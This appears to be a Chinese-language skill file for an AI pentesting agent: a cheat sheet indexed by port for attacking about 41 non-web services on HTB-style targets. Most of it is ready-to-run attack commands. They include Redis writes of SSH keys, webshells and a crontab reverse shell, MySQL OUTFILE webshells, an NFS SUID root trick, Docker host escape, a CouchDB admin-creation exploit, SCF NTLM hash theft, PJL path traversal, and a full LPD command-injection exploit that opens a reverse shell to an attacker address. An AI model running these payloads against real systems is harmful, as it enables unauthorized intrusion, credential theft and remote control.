---
name: 'service-attacks'
description: '非 Web 服务攻击速查：41 端口覆盖。按端口号索引，枚举→利用→验证。'
whenToUse: '非 Web 端口需要攻击速查时：按端口号索引定位枚举→利用→验证。'
metadata: { domain: network, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# 非 Web 服务攻击速查

> 🔴 **不自动加载。agent 需要时调用 `加载技能 service-attacks`，先读下面的端口索引定位目标端口。**

## 端口速查索引

| 端口 | 服务 | 关键攻击 |
|------|------|---------|
| 21 | FTP | anonymous 登录 / PUT webshell |
| 23 | Telnet | 弱密码 / 自定义 telnetd CVE |
| 25 | SMTP | VRFY/RCPT TO 用户枚举 |
| 53 | DNS | zone transfer → 子域泄露 |
| 79 | Finger | finger 用户枚举 |
| 110/995 | POP3 | 邮件枚举 + 弱密码 |
| 111 | RPC | rpcclient 枚举 |
| 139/445 | SMB | 匿名共享 / smbclient / SCF hash 窃取 |
| 143/993 | IMAP | 邮件枚举 + 弱密码 |
| 161 | SNMP | snmpwalk 信息泄露 |
| 389 | LDAP | 匿名 bind → ldapsearch 枚举 |
| 623 | IPMI | hashcat -m 7300 爆 BMC 密码 |
| 631 | IPP/CUPS | 打印机服务 → CUPS 漏洞 |\n| 515/1515 | LPD | 🔴 RFC 1179 → 控制文件 J 字段注入 (shell=True) → paperwork-box |\n| 873 | rsync | 匿名模块列举 → 下载 |
| 1099 | Java RMI | RMI 枚举 → 反序列化 |
| 1433 | MSSQL | xp_cmdshell / UNC injection → mssql-attack-chain |
| 1521 | Oracle DB | oscanner / ODAT 爆破 + 提权 |
| 2049 | NFS | showmount → no_root_squash |
| 2375 | Docker API | 未认证 → 容器逃逸 |
| 3000 | Grafana | CVE-2021-43798 LFI / 默认凭据 |
| 3306 | MySQL | UDF 提权 / FILE 读写 |
| 3389 | RDP | xfreerdp / NLA 绕过 |
| 4840 | OPC UA | 工业协议 → helix-box |
| 5432 | PostgreSQL | RCE: COPY FROM PROGRAM / UDF → postgresql-rce |
| 5900 | VNC | 弱密码 + vncviewer |
| 5985 | WinRM | evil-winrm PtH/密码 |
| 5984 | CouchDB | NoSQL → CVE-2017-12635 创建 admin |
| 6379 | Redis | 无认证 → 写 SSH key/webshell/crontab |
| 1883/8883 | MQTT | 🆕 匿名订阅泄露 / 弱密码喷洒 → mqtt-pentesting |
| 6443/10250| K8s API | SA token 枚举 → container-escape |
| 8009 | AJP | Ghostcat CVE-2020-1938 文件读取 |
| 8080/50000| Jenkins | 默认凭据 / Script Console RCE |
| 8089 | Splunk | 默认凭据 / Custom App RCE |
| 8200 | Vault | Unseal → Key/Value → 横向 |
| 8983 | Solr | Velocity Template RCE |
| 9090 | Prometheus | 元数据泄露 / 无认证 |\n| 9100 | PJL/JetDirect | 🔴 @PJL FSUPLOAD/FSDOWNLOAD → 路径穿越 → 文件读写。外部不可达时检查 localhost → paperwork-box |\n| 9200 | Elasticsearch | 无认证 → dump 数据 |
| 11211 | Memcached | 无认证 dump → session/token |
| 27017 | MongoDB | 无认证 → dump 数据库 |
| 61616 | ActiveMQ | CVE-2023-46604 反序列化 RCE |

---

## SNMP (161/162)

```
# 枚举 — community string: public / private / manager
snmpwalk -v1 -c public <IP>                  # 全量 walk
snmpwalk -v1 -c public <IP> 1.3.6.1.2.1.25.4.2.1.2  # 进程列表
snmpwalk -v1 -c public <IP> 1.3.6.1.4.1.77.1.2.25    # Windows 用户
snmp-check <IP> -c public                     # 一键枚举

# community string 爆破
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>

# 泄漏源: 用户名 / 进程 / 网络拓扑 / 内网 IP / 软件版本
```

---

## SMB (139/445) — 🔴 HTB 最常见非 Web 入口

```
# 匿名列出共享
smbclient -N -L //<IP>                    # 空密码列表
smbmap -H <IP>                            # 带权限标注
netexec smb <IP> -u '' -p '' --shares     # 批量检测

# 连接共享
smbclient //<IP>/share -N                  # 匿名连接
smbclient //<IP>/share -U user%pass        # 凭据连接

# 连接后: ls / get <file> / put <file> / mget * / recurse ON

# 🔴 可写共享 → SCF 窃取 NTLM hash:
# 1. 创建 .scf 文件内容: [Shell] / Command=2 / IconFile=\\<ATTACK_IP>\share\icon.ico
# 2. 放到可写共享 → 用户浏览文件夹自动请求 icon → NTLM hash 到 Responder

# 🔴 EternalBlue (MS17-010) → Metasploit exploit/windows/smb/ms17_010_eternalblue

# 凭据喷洒
netexec smb <IP> -u users.txt -p passwords.txt --no-bruteforce
```

---

## DNS (53)

```
# Zone Transfer — AXFR 未限制
dig axfr @<DNS_IP> <domain>
host -l <domain> <DNS_IP>
fierce --domain <domain> --dns-servers <DNS_IP>

# 常规记录枚举
dig ANY @<DNS_IP> <domain>          # 所有愿意公开的记录
dig A @<DNS_IP> <domain>            # IPv4
dig AAAA @<DNS_IP> <domain>         # IPv6
dig MX @<DNS_IP> <domain>           # 邮件服务器
dig NS @<DNS_IP> <domain>           # 域名服务器
dig TXT @<DNS_IP> <domain>          # SPF/DKIM 文本记录
dig SOA @<DNS_IP> <domain>          # 权威服务器

# 反向 DNS — IP → 域名
dig -x <IP> @<DNS_IP>

# DNS 子域爆破 (zone transfer 失败时)
dnsrecon -d <domain> -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 🔴 泄露: 子域名 / 内网 IP / SRV / 邮件服务器 / SPF
```

---

## LDAP (389)

```
# 匿名 bind — 不认证查询
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=htb"
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=htb" "(objectClass=*)"

# 先查 namingContexts (域的 base DN)
ldapsearch -H ldap://<IP> -x -s base namingcontexts

# 🔴 重点查 description 属性 — HTB 经典密码泄露点!
# 其他: sAMAccountName / userPrincipalName / member / memberOf
# LAPS: ms-Mcs-AdmPwd / gMSA: msDS-GroupMSAMembership

nmap -p 389 --script ldap-search <IP>
# 详细 AD LDAP → ad-checklist §1
```

---

## FTP (21)

```
ftp <IP>                              # anonymous / 空密码
# 登录后: ls -la / binary / passive / get <file> / put <file>
# 🔴 mget * — 批量下载当前目录所有文件

# lftp 一键镜像
lftp -e "mirror --verbose / ./loot/; quit" ftp://anonymous:@<IP>/

# 🔴 优先找: flag.txt / root.txt / *.conf / *.bak / id_rsa / .bash_history / .env

# FTP Bounce
nmap -b anonymous:anonymous@<IP>:21 -p 22,80,445 <internal_ip>
```

---

## SMTP (25)

```
# 用户枚举
smtp-user-enum -M VRFY -U users.txt -t <IP>
smtp-user-enum -M RCPT -U users.txt -t <IP>
smtp-user-enum -M EXPN -U users.txt -t <IP>

# 手动验证
nc <IP> 25
VRFY root
VRFY admin
MAIL FROM: test@test.com
RCPT TO: user@domain.htb

# 开放中继检测
# 能 RCPT TO: external@domain.com → 中继

# 邮件伪造
swaks --to victim@domain.htb --from admin@domain.htb --server <IP> --body "test"
```

---

## POP3 (110/995) / IMAP (143/993)

```
# POP3 — 邮件收取 (邮件存在服务器，下载后删除)
nc <IP> 110
USER <username>
PASS <password>
LIST                              # 列出邮件
RETR 1                            # 读取第 1 封
QUIT

# IMAP — 邮件管理 (邮件留在服务器)
# 连接: openssl s_client -connect <IP>:993   (SSL)
#        nc <IP> 143                           (plain)
a1 LOGIN <user> <pass>
a2 LIST "" "*"                     # 列出文件夹
a3 SELECT INBOX                   # 选择收件箱
a4 SEARCH ALL                     # 搜索所有邮件
a5 FETCH 1 BODY[]                 # 读第 1 封全文
a6 LOGOUT

# 自动化
hydra -l user -P wordlist pop3://<IP>
hydra -l user -P wordlist imap://<IP>
```

---

## Finger (79)

```
# 用户枚举 — 列出登录用户
finger @<IP>                       # 所有在线用户
finger admin@<IP>                  # 指定用户详情
finger 0@<IP>                      # 全系统用户 (部分实现)

# 用 finger-user-enum
finger-user-enum -U users.txt -t <IP>
```

---

## Telnet (23)

```
# 弱密码 + 明文流量
nc <IP> 23                         # 交互登录
# 🔴 流量不加密 → tcpdump/Wireshark 直接看到密码
# 常见默认凭证: root:root / admin:admin / cisco:cisco

hydra -l root -P passwords.txt telnet://<IP>

# 🆕 自定义 telnetd → 搜 CVE!
# 很多 CTF 用非标准 telnetd（不是 inetutils/telnetd）
# 特征: telnet 登录时看到的 banner 不是标准 "Ubuntu 22.04" → 搜这个 banner
# 特征: telnet 登录有非标准选项（-E / LIBPATH / NEW-ENVIRON）→ 搜这个选项名
# 🔴 看到 "telnetd" 出现在 ps aux 或 ss 输出 → 立即:
#   searchsploit telnetd
#   Google: "CVE telnetd <banner_text>"
#   Google: "CVE telnetd <option_name>"  (如 "CVE telnetd NEW-ENVIRON")

# 🆕 Orion HTB 案例: 自定义 telnetd + -E exec-login → CVE-2026-24061 auth bypass
# 拿到 adam 密码 → SSH → ss -tlnp → 23 端口 → 搜 "CVE telnetd" → 秒出
```

---

## Redis (6379)

```
# 检测无认证
redis-cli -h <IP> INFO             # 无密码直连 → 返回版本信息

# 有密码爆破
hydra -P passwords.txt redis://<IP>

# 🔴 RCE 路径 1: 写 SSH key
redis-cli -h <IP>
config set dir /root/.ssh/
config set dbfilename authorized_keys
set key "\n\nssh-rsa AAAA...\n\n"
save

# 🔴 RCE 路径 2: 写 webshell
config set dir /var/www/html/
config set dbfilename shell.php
set key "<?php system($_GET['c']);?>"
save

# 🔴 RCE 路径 3: crontab
config set dir /var/spool/cron/crontabs/   # Debian/Ubuntu
# config set dir /var/spool/cron/          # RHEL/CentOS
config set dbfilename root
set key "\n* * * * * bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\n"
save

# 验证
redis-cli -h <IP> config get dir   # 确认写入路径
```

---

## IPMI (623)

```
# 检测版本
nmap -sU -p 623 --script ipmi-version <IP>

# 🔴 Cipher Zero 认证绕过 — 无需认证直接 dump hash
# IPMI 2.0 RAKP 协议泄露 salted SHA1 → 可 offline crack
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
# 设置 RHOSTS → 跑 → 拿到 hash → offline crack
hashcat -m 7300 ipmi.hash rockyou.txt

# ipmitool 交互 (有凭据时)
ipmitool -H <IP> -U admin -P <password> user list
ipmitool -H <IP> -U admin -P <password> lan print
ipmitool -H <IP> -U admin -P <password> sol activate  # Serial over LAN

# 🔴 BMC 密码 → 常复用为 OS root/Administrator 密码
# 🔴 Serial over LAN → OS 挂了也能拿 shell
```

---

## rsync (873)

```
# 匿名列表
rsync rsync://<IP>/
rsync rsync://<IP>/module/

# 下载模块全部文件
rsync -av rsync://<IP>/module/ ./loot/

# 上传 webshell (如果模块可写)
rsync -av shell.php rsync://<IP>/module/www/shell.php

# 🔴 常见发现: 配置文件 / 源码 / SSH key / 数据库备份
```

---

## MongoDB (27017)

```
# 无认证连接
mongo --host <IP> --port 27017
mongosh <IP>:27017

# 枚举数据库
show dbs
use <db>
show collections
db.<collection>.find().pretty()

# 凭据常见位置: admin.users / config / settings
# 🔴 dump 整个数据库
mongodump --host <IP> --port 27017

# 有密码: mongodump -u user -p pass --host <IP> --authenticationDatabase admin
```

---

## Memcached (11211)

```
# 检测
nc <IP> 11211
stats
stats items
stats cachedump <slab_id> <limit>

# 自动化
memcdump --servers=<IP>
memccat --servers=<IP> <key>            # 读指定 key 值

# 🔴 常见泄露: PHP session / 框架缓存 token / API key
# 注意: Memcached 不加密，所有数据明文存储
```

---

## 🆕 MQTT (1883/8883)

```
# 检测
nmap -sV -p 1883,8883 <IP>

# 🔴 匿名订阅（最常见 — 数据泄露入口）
mosquitto_sub -h <IP> -t '#' -v -C 20        # 订阅所有 topic, 取20条
mosquitto_sub -h <IP> -t '$SYS/#' -v          # Broker 状态 (可能需认证)

# 🔴 匿名发布（测试是否可写 — C2 注入可能）
mosquitto_pub -h <IP> -t 'test/topic' -m 'hello'

# 有认证时的弱密码喷洒
mosquitto_sub -h <IP> -u admin -P admin -t '#'
hydra -l admin -P /usr/share/wordlists/rockyou.txt mqtt://<IP>

# 🔴 常见泄露: 内网 IP / vhost / 凭据 / 系统健康状态 / C2 通信
# 🔴 常见密码: admin/admin, 空密码, 服务名重复
```

---

## RPC / NFS (111 / 2049)

### RPC (111)

```
# 枚举 RPC 服务
rpcinfo -p <IP>

# 枚举用户/组 (不认证)
rpcclient -U '' -N <IP>                     # 空字符串用户
> enumdomusers        # 列出所有用户 (rid-brute)
> enumdomgroups       # 列出所有组
> queryuser <RID>     # 用户详情
> querygroup <RID>    # 组成员
> lsaenumsid          # SID 枚举
> lookupnames <user>  # SID 查询
```

### NFS (2049)

```
# 列出共享
showmount -e <IP>

# 挂载
mkdir /mnt/nfs; mount -t nfs <IP>:/share /mnt/nfs
mount -t nfs <IP>:/share /mnt/nfs -o nolock

# 🔴 no_root_squash → UID 0 的文件当 root
# 攻击: 本地创建 SUID bash，UID=0 拥有者，放 NFS 共享，目标执行→root
cp /bin/bash /mnt/nfs/bash; chown 0:0 /mnt/nfs/bash; chmod 4755 /mnt/nfs/bash
```

---
## MySQL (3306)
```
# 无密码连接
mysql -h <IP> -u root

# 🔴 UDF 提权 (root + FILE 权限)
# 详见 mysql-udf-privesc — 编译 .so → CREATE FUNCTION → cmd

# 读文件: SELECT LOAD_FILE('/etc/passwd');
# 写 webshell: SELECT '<?php system($_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/s.php';
# 注意: PHP代码内双引号需转义或改用单引号包裹

# 爆破: hydra -l root -P passwords.txt mysql://<IP>
```

---
## WinRM (5985/5986)
```
# 密码认证
evil-winrm -i <IP> -u user -p 'pass'

# PtH (NTLM hash)
evil-winrm -i <IP> -u user -H <NTHASH>

# Kerberos 认证
evil-winrm -i <FQDN> -u user -k          # 需 KRB5CCNAME 已设置

# SSL (5986) — 自签名证书
evil-winrm -i <IP> -u user -p 'pass' -S   # 跳过证书验证

# netexec 批量
netexec winrm <IP> -u user -p pass -x 'whoami'

# 🔴 目标用户需在 Remote Management Users 组
# 详细横向 → lateral-movement skill
```

---
## RDP (3389)
```
# 密码登录
xfreerdp /v:<IP> /u:user /p:'pass' /cert:ignore +clipboard

# PtH (Restricted Admin 模式 — 目标需启用)
xfreerdp /v:<IP> /u:user /pth:<NTHASH> /cert:ignore

# 驱动重定向 — 传文件/工具到目标
xfreerdp /v:<IP> /u:user /p:'pass' /cert:ignore \
  /drive:share,/tmp/share          # \\tsclient\share 在目标可见

# NLA 检测
nmap -p 3389 --script rdp-ntlm-info <IP>

# 🔴 BlueKeep (CVE-2019-0708) — 老 Windows 7/2008 R2
```

---

## 🆕 新增端口速查

### Docker API (2375/2376)

```
# 未认证 Docker daemon
curl http://<IP>:2375/containers/json
docker -H tcp://<IP>:2375 ps
docker -H tcp://<IP>:2375 run -v /:/host -it alpine chroot /host /bin/bash
# 🔴 等价于 root — Docker daemon 以 root 运行
```

### Jenkins (8080/50000)

```
# 默认凭据
admin:admin / admin:password / jenkins:jenkins

# Script Console → RCE
# URL: http://<IP>:8080/script
# Groovy: "powershell.exe -enc <B64>".execute().text

# 🔴 /script → Jenkins admin → direct Groovy RCE
# 🔴 CVE-2024-23897: 未认证 LFI → /jnlpJars/* → 读任意文件

# Jenkins CLI (50000)
java -jar jenkins-cli.jar -s http://<IP>:8080 who-am-i
```

### ActiveMQ (61616)

```
# 🔴 CVE-2023-46604 OpenWire 反序列化 RCE
# 无需认证 → 直传恶意序列化对象 → 命令执行
# GitHub: git@github.com:SleepingBag945/CVE-2023-46604.git

# 检测
nc <IP> 61616                         # ActiveMQ | OpenWire
```

### AJP (8009) — Apache JServ Protocol

```
# 🔴 Ghostcat (CVE-2020-1938) → 读 Tomcat WEB-INF 任意文件
# AJP 协议默认只允许 localhost (8009 对外 = 配置错误)
python3 ghostcat.py <IP> 8009 /WEB-INF/web.xml
# → 泄露 web.xml → 发现 servlet 映射 / 凭据
```

### VNC (5900)

```
# 检测 — 无需连接
nmap -p 5900 --script vnc-info <IP>
nmap -p 5900 --script vnc-title <IP>

# 爆破
hydra -P /usr/share/wordlists/rockyou.txt vnc://<IP>
# 或 metasploit: auxiliary/scanner/vnc/vnc_login

# 连接 (拿到密码后)
vncviewer <IP>::5900
echo '<password>' | vncviewer <IP>::5900 -autopass
xtightvncviewer <IP>::5900 -autopass
```

### IPP/CUPS (631)

```
# 打印机先枚举
curl http://<IP>:631/printers
curl http://<IP>:631/admin
cupsctl --server <IP>:631           # CUPS 配置

# 🔴 CUPS vulnerabilities: CVE-2024-47176 (browse port) / CVE-2024-47076
```

### Grafana (3000)

```
# 默认凭据: admin:admin
# 🔴 CVE-2021-43798: /public/plugins/<plugin>/../../etc/grafana/grafana.ini
# → 未认证 LFI → 读取配置文件 → 含 SMTP 密码 / 数据库凭据
curl http://<IP>:3000/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini
```

### Elasticsearch (9200)

```
# 无认证 → dump 数据
curl http://<IP>:9200/_cat/indices?v      # 列出所有索引
curl http://<IP>:9200/<index>/_search?q=*  # dump 全部数据
curl http://<IP>:9200/_nodes               # 节点信息

# 🔴 常见泄露: 用户数据 / API key / 内部文档
```

### CouchDB (5984)

```
# 无认证
curl http://<IP>:5984/_all_dbs
curl http://<IP>:5984/_users

# 🔴 CVE-2017-12635: 权限绕过 → 创建 admin 用户
curl -X PUT http://<IP>:5984/_users/org.couchdb.user:evil \
  -H "Content-Type: application/json" \
  -d '{"type":"user","name":"evil","roles":["_admin"],"password":"pwned"}'
# → admin 创建成功 → 登录 /_utils → 全库读写
```

### Oracle DB (1521)

```
# 枚举
oscanner -s <IP>                     # SIET infosec oracle scanner
nmap -p 1521 --script oracle-sid-brute <IP>

# ODAT (Oracle Database Attacking Tool)
odat all -s <IP>                     # 全模块自动探测
odat passwordguesser -s <IP> -d <SID>  # 密码爆破
```

### Java RMI (1099/1098)

```
# 枚举 RMI Registry
rmiregistry -l <IP> 1099             # 列出注册的对象
nmap -p 1099 --script rmi-dumpregistry <IP>

# 🔴 反序列化 RCE (如果注册表中有危险对象)
# 工具: BaRMIe / rmiscout
```

### Solr (8983)

```
# 默认无认证
curl http://<IP>:8983/solr/admin/cores     # 列出 cores
curl http://<IP>:8983/solr/<core>/config    # 配置

# 🔴 Velocity Template RCE (CVE-2019-17558)
curl http://<IP>:8983/solr/<core>/config -d '{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'

# 🔴 Config API → 创建恶意 core → RCE
```

### Splunk (8089)

```
# 默认凭据: admin:changeme / admin:admin
# 管理员 → Apps → Install App from File → 上传恶意 .tar.gz
# .tar.gz 含 payload.py → 内置 import subprocess → 拿到 shell
```

### Vault (8200)

```
# 检测 seal 状态 — unsealed / sealed
curl http://<IP>:8200/v1/sys/seal-status

# unsealed + 有 token？→ 遍历 KV secrets
curl -H "X-Vault-Token: <TOKEN>" http://<IP>:8200/v1/secret/metadata?list=true

# 🔴 沿 KV 路径读 secrets → 任何凭据都可能存在 (DB/AWS/AD)
```

### Prometheus (9090)

```
# 无认证 → 通读 metrics
curl http://<IP>:9090/api/v1/query?query=up
curl http://<IP>:9090/api/v1/label/__name__/values  # 所有 metric names

# 🔴 泄露: 内网 IP / 服务名 / 环境变量 / alertmanager 配置
```

### K8s API (6443/10250)

```
# 6443 → 需要 SA token → 尝试 /version
curl -k https://<IP>:6443/version

# 10250 → kubelet → 无认证 (可列出 pods)
curl -k https://<IP>:10250/pods

# 🔴 详细逃逸: container-escape §K8s
```

### OPC UA (4840)

```
# 工业协议 — Helix HTB 案例
# 工具: opcua-client / python-opcua
# 详见 helix-box
```

### PostgreSQL (5432) / MSSQL (1433)

```
# → 已有独立记忆 postgresql-rce / mssql-attack-chain
# nmap 脚本: nmap -p 5432 --script postgres-brute <IP>
#             nmap -p 1433 --script ms-sql-info <IP>
```

---

---

## 🆕 SSL/TLS 证书与协议漏洞

### 证书信息泄露 — 🔴 最容易漏的攻击面

```
# nmap -sC 输出的 ssl-cert 脚本 → 不要跳过！
# Subject CN / SAN / Issuer → 藏着内部域名和组织结构

# 手动提取
openssl s_client -connect IP:PORT </dev/null 2>/dev/null | openssl x509 -text | grep -E "Subject:|DNS:|Email:"
nmap -p PORT --script ssl-cert IP

# 🔴 重点找:
#   CN=xxx.internal.htb → 新子域 → 加 /etc/hosts
#   DNS:dev.htb, DNS:api.htb → SAN → 多个子域全加
#   Email: admin@domain → 用户名格式 → 密码喷洒用
#   Issuer: CN=ca.internal.corp → 可能内部 CA → ADCS 攻击面
```

### 协议版本漏洞（罕见但秒杀）

```bash
nmap -p 443 --script ssl-heartbleed,ssl-poodle IP
# Heartbleed → 内存泄露 → 私钥/session/密码
# POODLE → SSLv3 padding oracle
```

---

## 快速优先级

| 优先级 | 条件 | 方法 |
|--------|------|------|
| 🔴 1 | Redis:6379 无密码 | 写 SSH key / crontab / webshell |
| 🔴 2 | NFS no_root_squash | 创建 SUID bash → mount → 执行 |
| 🔴 3 | Docker API:2375 无认证 | docker -H exec → host root |
| 🔴 4 | SNMP public community | snmpwalk 全量枚举 → 找凭据/密码 |
| 🔴 5 | ActiveMQ:61616 | CVE-2023-46604 → instant RCE |
| 🔴 6 | Jenkins /script | admin → Groovy RCE |
| 🔴 7 | FTP anonymous + 可写 | PUT webshell |
| 🔴 8 | MongoDB 无认证 | mongodump → 查用户表 |
| 🟠 9 | CouchDB:5984 无认证 | CVE-2017-12635 → 创建 admin |
| 🟠 10 | AJP:8009 | Ghostcat CVE-2020-1938 → 读文件 |
| 🟠 11 | Grafana:3000 | CVE-2021-43798 LFI |
| 🟠 12 | rsync 匿名可读 | 下载配置/源码 → 找凭据 |
| 🟠 13 | rpcclient 空会话 | enumdomusers → 密码喷洒 |
| 🟡 14 | Elasticsearch:9200 | curl _search → dump 数据 |
| 🟡 15 | IPMI dump | hashcat -m 7300 |
| 🟡 16 | Memcached 无认证 | stats cachedump → session |
| 🟡 17 | VNC | 弱密码爆破 |
| 🟡 18 | SMTP VRFY | 用户枚举 → 密码喷洒 |
| 🟡 19 | POP3/IMAP | 弱密码 + 邮件内容 |
| 🔴 20 | SMB 匿名共享 | smbclient 列目录 → 下载敏感 → SCF 窃 hash |
| 🔴 21 | DNS zone transfer | dig axfr → 子域/IP 全泄露 |
| 🟠 22 | MySQL root 无密码 | UDF 提权 / SELECT INTO OUTFILE 写 webshell |
| 🟡 23 | Oracle tns 开放 | oscanner → ODAT |
| 🔴 24 | LPD 1515 shell=True | J 字段注入 → paperwork-box |
| 🔴 25 | PJL 9100 路径穿越 | FSUPLOAD/FSDOWNLOAD → SSH key 投递 → paperwork-box |

## 反模式

| ❌ 禁止 | ✅ 正确 |
|--------|--------|
| ❌ 看到非 Web 端口跳过 | ✅ 查本表 → 逐协议试枚举 |
| ❌ Redis 有密码就放弃 | ✅ hydra 爆破常见密码 |
| ❌ rpcclient 报错就换工具 | ✅ 空会话失败试已知用户名 |
| ❌ SMB 匿名失败就跳过 | ✅ 试 guest/anonymous + 空密码 + 常见密码组合 |
| 🆕 ❌ 9100/JetDirect 从外部死磕 >5 分钟 | ✅ 立即换其他端口拿 shell → `ss -tlnp` 确认是否 127.0.0.1 绑定 |
| 🆕 ❌ LPD 注入 sleep 盲测 | ✅ Popen 非阻塞 → 用 OOB(DNS/反弹 shell) 验证，不用 sleep |

---

## 🆕 LPD — Line Printer Daemon (515/1515)

```
# 🔴 RFC 1179 协议 — 常见于 HTB Linux 靶机

# 队列状态 (短/长):
printf '\x03\n' | nc <IP> 1515      # 短格式 → 返回打印机名称
printf '\x04\n' | nc <IP> 1515      # 长格式

# 提交打印作业 (完整流程):
# 1. 确定队列名 → 通常从 Web 页面/枚举获取
# 2. \x02<queue>\n  → 等待 \x00 (ACK)
# 3. \x02<size> cfA000host\n → 控制文件头 (LPD 标准格式!)
# 4. 等待 \x00 → 发送控制文件内容
# 5. 控制文件行: H<host>\n P<user>\n J<jobname>\n f<filename>\n

# 🔴 shell=True 注入 (Paperwork 模式):
# 注入点在 J 字段: J'; <cmd>; echo '
# → 构造: f"echo 'Archive: {job_name}' >> log" → 跳出单引号
# ⚠️ Popen 非阻塞 → 不要用 sleep 盲测 → 直接用反弹 shell

# 完整 exploit:
python3 -c "
import socket, time
s = socket.socket(); s.settimeout(5)
s.connect(('<IP>', 1515))
s.send(b'\x02archive_intake\n')
s.recv(1)  # ACK
cmd = 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
ctrl = f'Hhost\nPuser\nJ\\'; {cmd}; echo \\'\n'.encode()
s.send(b'\x02' + str(len(ctrl)).encode() + b' cfA000host\n')
s.recv(1)
s.send(ctrl)
s.close()
"

# 🔴 关键教训:
# ① 控制文件子命令格式: \x02 + 字节数(ASCII) + 空格 + cfA + 作业号 + 主机名 + \n
# ② 注入用 ; 无条件分隔，不要用 || (echo 返回 0)
# ③ 下载的 server.py 可能有 bug (缺 import)，不代表运行版本
# 详见 paperwork-box
```

## 🆕 PJL / JetDirect (9100)

```
# 🔴 HP Printer Job Language — 自定义文件系统读写
# ⚠️ 9100 常绑定在 127.0.0.1 → 外部不可达!
#    → 拿 shell 后 ss -tlnp → 127.0.0.1:9100 → 从目标本地连接

# 快速检测:
printf '@PJL INFO ID\r\n' | nc 127.0.0.1 9100
# → "HP LASERJET 4ML" = 确认 PJL

# 文件系统查看 (FSQUERY):
python3 -c "import socket;s=socket.socket();s.settimeout(5);s.connect(('127.0.0.1',9100));s.send(b'@PJL FSQUERY NAME=\".\"\r\n');print(s.recv(4096).decode());s.close()"

# 读文件 (FSUPLOAD):
python3 -c "import socket;s=socket.socket();s.settimeout(5);s.connect(('127.0.0.1',9100));s.send(b'@PJL FSUPLOAD NAME=\"0:../user.txt\"\r\n');print(s.recv(4096));s.close()"

# 写文件 (FSDOWNLOAD):
python3 -c "
import socket
s = socket.socket(); s.settimeout(5)
s.connect(('127.0.0.1', 9100))
data = b'my content\n'
s.send(f'@PJL FSDOWNLOAD NAME=\"0:../.ssh/authorized_keys\" SIZE={len(data)}\r\n'.encode())
s.send(data)
print(s.recv(4096))  # OK = 成功
s.close()
"

# 🔴 路径穿越: os.path.normpath(os.path.join(ROOT, user_input))
# ROOT → ps aux | grep 服务名 看 cmdline
# 从少到多试: ../ → ../../ → ../../../
# FSDOWNLOAD → os.makedirs(dirname, exist_ok=True) → 自动创建目录!
# 详见 paperwork-box
```
